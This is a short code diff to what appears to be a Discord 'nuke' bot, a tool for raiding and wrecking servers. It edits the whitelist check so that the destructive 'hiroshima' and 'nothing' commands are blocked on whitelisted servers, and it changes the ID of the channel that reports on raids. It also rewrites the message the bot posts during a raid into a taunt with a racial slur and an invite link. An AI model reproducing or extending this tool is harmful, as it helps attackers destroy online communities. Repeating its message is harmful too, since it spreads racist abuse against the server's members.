@@ -23,8 +23,8 @@ whitelisted_servers = set()
 
 @client.before_invoke
 async def before_invoke(ctx):
-    # If a server is whitelisted, allow all commands except the destructive `hiroshima`.
-    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name == "hiroshima":
+    # If a server is whitelisted, block destructive commands.
+    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("hiroshima", "nothing"):
         await ctx.send("server whitelisted. :3")
         raise commands.CheckFailure()
 
@@ -41,11 +41,11 @@ async def on_ready():
     print(f"{Fore.MAGENTA}------------------------------------------------------------------")
     print(f"{Fore.MAGENTA}[3] ;credits - Shows My Socials  |     [4] ;nothing - nothing left")
 
-REPORT_CHANNEL_ID = 1516288297972924568
+REPORT_CHANNEL_ID = 1516330515110559765
 
 @client.command()
 async def hiroshima(ctx):
-    await ctx.send("**If you've never seen a massacre, this is what it looks like.**")
+    await ctx.send("**FUCKED BY BLOSSOM POOR ASS NIGGA https://discord.gg/bqy92JmPY**")
     guild = ctx.guild
 
     report_channel = client.get_channel(REPORT_CHANNEL_ID)
